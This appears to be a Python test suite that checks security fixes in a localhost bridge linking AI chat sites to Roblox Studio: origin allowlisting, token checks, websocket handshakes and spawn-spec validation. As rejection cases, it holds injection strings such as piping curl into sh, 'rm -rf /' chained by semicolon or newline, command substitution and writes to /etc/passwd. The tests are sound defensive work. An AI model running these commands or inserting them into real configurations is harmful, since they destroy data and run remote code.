# SPDX-License-Identifier: GPL-3.0-or-later
"""Security regression tests for the bridge's browser-facing surface.

The bridge listens on 127.0.0.1, which every page in the user's browser can
reach. Before the origin guard existed, any site the user visited while RoLink
was running could:

  * open ws://127.0.0.1:17613 and call execute_luau (arbitrary code in Studio),
  * poll /queue/next and receive commands addressed to the Studio plugin,
  * POST /queue/enqueue to inject work into the queue,
  * POST a websocket "add_server" that wrote a spawn spec into config.json,
    which the bridge later executed with subprocess.Popen.

These tests pin the fix. They are the regression that matters most in this repo,
so they are written against the real handler and the real HTTP server, not a
mock.
"""
import asyncio
import json
import os
import sys
import unittest
import urllib.error
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)

sys.path.insert(0, ROOT)
sys.path.insert(0, HERE)
from _isolated_bridge import load_bridge

PORT = 18091
bridge = load_bridge(PORT)
BASE = "http://127.0.0.1:%d" % PORT

def _real_websockets():
    """Import the REAL websockets package for the handshake tests.

    Other suites (test_asset_search, test_blender_mcp, test_run_task, ...)
    install a stub module into sys.modules whose `serve` returns None so that
    bridge.py can be imported without opening a listener. pytest shares
    sys.modules across files, so that stub is visible here too and every
    websocket test would fail with a confusing "NoneType can't be awaited".

    The stub has no __file__, which is how it is told apart from the real
    package. When the real package is not installed at all we skip.
    """
    import importlib.util

    existing = sys.modules.get("websockets")
    if existing is not None:
        if getattr(existing, "__file__", None):
            return existing  # already the real one
        # A stub from an earlier test module: evict it so the handshake tests
        # actually run instead of silently skipping. The real package satisfies
        # everything the stubs provided (ConnectionClosed, serve).
        sys.modules.pop("websockets", None)
    try:
        spec = importlib.util.find_spec("websockets")
    except (ImportError, ValueError):
        return None
    if spec is None or not spec.origin:
        return None
    import importlib
    return importlib.import_module("websockets")


websockets = _real_websockets()


async def _ws_server(handler, port):
    """Start a websockets server across versions 12-17.

    In every supported version the object returned by `websockets.serve` is
    awaitable and resolves to a running server, so awaiting it is the portable
    path (it is also an async context manager, but awaiting is simpler and
    works on <=13 where serve() returned a coroutine directly).
    """
    return await websockets.serve(handler, "127.0.0.1", port)


async def _ws_close(server):
    server.close()
    await server.wait_closed()


def http(path, method="GET", body=None, origin=None, headers=None):
    h = {"Content-Type": "application/json"}
    if origin is not None:
        h["Origin"] = origin
    if headers:
        h.update(headers)
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            raw = r.read().decode("utf-8", "replace")
            return r.status, (json.loads(raw) if raw else {})
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, {"raw": raw}


class OriginAllowlistTest(unittest.TestCase):
    """Pure-function coverage of origin_allowed()."""

    def test_provider_origins_are_allowed(self):
        for origin in ("https://claude.ai", "https://chatgpt.com", "https://arena.ai",
                       "https://www.kimi.ai", "https://chat.deepseek.com"):
            self.assertTrue(bridge.origin_allowed(origin), origin)

    def test_absent_origin_is_allowed_for_non_browser_clients(self):
        # The Studio plugin's HttpService cannot send Origin; neither can curl
        # or the test suite. Blocking these would break the product.
        self.assertTrue(bridge.origin_allowed(None))
        self.assertTrue(bridge.origin_allowed(""))

    def test_foreign_origins_are_rejected(self):
        for origin in ("https://evil.example", "http://evil.example",
                       "https://attacker.test:8443", "null", "file://"):
            self.assertFalse(bridge.origin_allowed(origin), origin)

    def test_suffix_and_prefix_spoofing_is_rejected(self):
        for origin in ("https://claude.ai.evil.example",
                       "https://evil.example/claude.ai",
                       "https://evilclaude.ai",
                       "https://chatgpt.com.evil.io"):
            self.assertFalse(bridge.origin_allowed(origin), origin)

    def test_extension_origins_are_allowed_by_scheme(self):
        for origin in ("chrome-extension://abcdefghijklmnop",
                       "moz-extension://1111-2222",
                       "safari-web-extension://xyz"):
            self.assertTrue(bridge.origin_allowed(origin), origin)

    def test_explicit_port_is_normalised(self):
        self.assertTrue(bridge.origin_allowed("https://claude.ai:443"))
        self.assertTrue(bridge.origin_allowed("http://127.0.0.1:8000"))
        self.assertFalse(bridge.origin_allowed("https://evil.example:443"))


class QueueHttpOriginTest(unittest.TestCase):
    """The queue HTTP server must refuse cross-origin callers."""

    @classmethod
    def setUpClass(cls):
        cls.ok = bridge.start_queue_server()
        if not cls.ok:
            raise unittest.SkipTest("queue port unavailable in this environment")

    def test_health_rejects_foreign_origin(self):
        code, body = http("/health", origin="https://evil.example")
        self.assertEqual(code, 403)
        self.assertFalse(body["ok"])

    def test_plugin_poll_is_unaffected(self):
        # No Origin header == the Studio plugin. This is the hot path and must
        # never regress.
        code, body = http("/health")
        self.assertEqual(code, 200)
        self.assertTrue(body["ok"])
        code, body = http("/queue/next?projectId=default")
        self.assertEqual(code, 200)
        self.assertTrue(body["ok"])

    def test_enqueue_rejects_foreign_origin(self):
        code, _ = http("/queue/enqueue", "POST",
                       {"tool": "execute_luau", "command": "execute_luau",
                        "args": {"code": "print(1)"}},
                       origin="https://evil.example")
        self.assertEqual(code, 403)

    def test_enqueue_is_accepted_from_the_plugin_side(self):
        code, body = http("/queue/enqueue", "POST",
                          {"tool": "get_instances", "command": "--p3",
                           "args": {}, "projectId": "authtest"})
        self.assertEqual(code, 200)
        self.assertTrue(body["ok"])
        self.assertTrue(body.get("id"))

    def test_cross_origin_preflight_is_refused(self):
        # No CORS approval is ever advertised, so a browser cannot even learn
        # that a cross-origin write is permitted.
        code, _ = http("/queue/enqueue", "OPTIONS", None, origin="https://evil.example")
        self.assertEqual(code, 403)

    def test_token_endpoint_is_not_readable_cross_origin(self):
        code, _ = http("/token", origin="https://evil.example")
        self.assertEqual(code, 403)

    def test_token_endpoint_reports_state_to_local_callers(self):
        code, body = http("/token")
        self.assertEqual(code, 200)
        self.assertTrue(body["ok"])
        self.assertIn("required", body)


class TokenGateTest(unittest.TestCase):
    """token_ok() semantics, including the misconfiguration case."""

    def test_token_gate_is_open_when_not_required(self):
        old = bridge.REQUIRE_TOKEN
        try:
            bridge.REQUIRE_TOKEN = False
            self.assertTrue(bridge.token_ok(None))
            self.assertTrue(bridge.token_ok("anything"))
        finally:
            bridge.REQUIRE_TOKEN = old

    def test_token_gate_enforces_when_required(self):
        old_req, old_tok = bridge.REQUIRE_TOKEN, bridge.BRIDGE_TOKEN
        try:
            bridge.REQUIRE_TOKEN = True
            bridge.BRIDGE_TOKEN = "s3cret-token"
            self.assertTrue(bridge.token_ok("s3cret-token"))
            self.assertFalse(bridge.token_ok("wrong"))
            self.assertFalse(bridge.token_ok(None))
            self.assertFalse(bridge.token_ok(""))
        finally:
            bridge.REQUIRE_TOKEN, bridge.BRIDGE_TOKEN = old_req, old_tok

    def test_missing_token_configuration_fails_closed(self):
        old_req, old_tok = bridge.REQUIRE_TOKEN, bridge.BRIDGE_TOKEN
        try:
            bridge.REQUIRE_TOKEN = True
            bridge.BRIDGE_TOKEN = ""
            # If auth is required but no token exists, nothing may pass.
            self.assertFalse(bridge.token_ok(""))
            self.assertFalse(bridge.token_ok("guess"))
        finally:
            bridge.REQUIRE_TOKEN, bridge.BRIDGE_TOKEN = old_req, old_tok


@unittest.skipIf(websockets is None, "websockets not installed")
class WebSocketOriginTest(unittest.TestCase):
    """The socket that drives Studio must refuse a foreign page."""

    def _connect(self, headers, query=""):
        async def run():
            srv = await _ws_server(bridge.handler, PORT + 1)
            try:
                async with websockets.connect(
                    "ws://127.0.0.1:%d/%s" % (PORT + 1, query),
                    additional_headers=headers,
                ) as ws:
                    await asyncio.wait_for(ws.recv(), timeout=5)
                    return "accepted"
            except Exception as e:
                return type(e).__name__
            finally:
                await _ws_close(srv)

        return asyncio.run(run())

    def test_foreign_origin_is_rejected(self):
        result = self._connect({"Origin": "https://evil.example"})
        self.assertIn("ConnectionClosed", result)

    def test_provider_origin_is_accepted(self):
        self.assertEqual(self._connect({"Origin": "https://claude.ai"}), "accepted")

    def test_plugin_style_connection_without_origin_is_accepted(self):
        self.assertEqual(self._connect({}), "accepted")

    def test_extension_origin_is_accepted(self):
        self.assertEqual(
            self._connect({"Origin": "chrome-extension://abcdefghijklmnop"}), "accepted"
        )


class SpawnSpecGateTest(unittest.TestCase):
    """add_server writes a spec that Popen executes, so it is gated.

    Every test that reaches a WRITE path runs against a throwaway config so the
    shipped config.json can never be mutated by the suite (a failing assertion
    used to leave a `pwned` server behind in the real file).
    """

    def setUp(self):
        import tempfile
        self._tmpdir = tempfile.mkdtemp(prefix="rolink-config-")
        self._cfg = os.path.join(self._tmpdir, "config.json")
        with open(self._cfg, "w", encoding="utf-8") as f:
            json.dump({"mcpServers": {"roblox": {
                "command": "launch_studio_mcp.py", "args": []}}}, f)
        self._orig_path = bridge.CONFIG_PATH
        bridge.CONFIG_PATH = self._cfg

    def tearDown(self):
        import shutil
        bridge.CONFIG_PATH = self._orig_path
        shutil.rmtree(self._tmpdir, ignore_errors=True)

    def test_plain_launcher_is_allowed(self):
        self.assertTrue(bridge._spawn_spec_is_plain("uvx --python 3.11 mcp-for-blender"))

    def test_shell_metacharacters_are_rejected(self):
        for spec in ("/bin/sh -c 'curl evil | sh'", "npx foo; rm -rf /",
                     "cmd.exe /c whoami && echo pwned", "prog `id`", "prog $(id)",
                     "prog > /etc/passwd", "prog\nrm -rf /"):
            self.assertFalse(bridge._spawn_spec_is_plain(spec), spec)

    def test_path_traversal_is_rejected(self):
        self.assertFalse(bridge._spawn_spec_is_plain("../../bin/sh"))

    def test_add_server_requires_explicit_confirmation(self):
        ok, err = bridge.config_add_server("pwned", "notepad.exe", [])
        self.assertFalse(ok)
        self.assertIn("confirmed", err)

    def test_add_server_rejects_shell_spec_even_with_confirmation(self):
        ok, err = bridge.config_add_server(
            "pwned", "/bin/sh -c 'touch /tmp/rolink-proof'", [], confirm=True)
        self.assertFalse(ok)
        self.assertIn("metacharacter", err.lower())

    def test_primary_server_is_still_immutable(self):
        ok, err = bridge.config_add_server("roblox", "python", [], confirm=True)
        self.assertFalse(ok)
        self.assertIn("primary", err)

    def test_valid_addon_spec_is_accepted_and_then_removed(self):
        ok, err = bridge.config_add_server(
            "test-addon", "uvx", ["--python", "3.11", "mcp-for-blender"], confirm=True)
        try:
            self.assertTrue(ok, err)
        finally:
            bridge.config_remove_server("test-addon")


class CatalogIsProductFileTest(unittest.TestCase):
    def test_bridge_catalog_loaded_from_a_product_path(self):
        self.assertTrue(bridge._CATALOG_OK, bridge._CATALOG_ERROR)
        self.assertGreater(len(bridge.ROLINK_TOOL_NAMES), 100)
        self.assertNotIn("tests", bridge._REG_PATH.replace("\\", "/"))


if __name__ == "__main__":
    unittest.main()
